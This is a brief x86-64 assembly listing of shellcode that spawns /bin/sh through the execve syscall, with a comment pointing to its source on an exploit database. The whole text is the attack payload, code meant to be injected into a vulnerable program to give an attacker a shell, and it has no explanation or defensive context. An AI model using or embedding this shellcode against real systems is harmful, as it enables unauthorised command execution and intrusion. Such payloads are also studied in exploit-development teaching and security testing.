section .text
    ; http://www.exploit-db.com/exploits/13691/
    xor     rdx, rdx
    mov     qword rbx, '//bin/sh'
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     al, 0x3b
    syscall
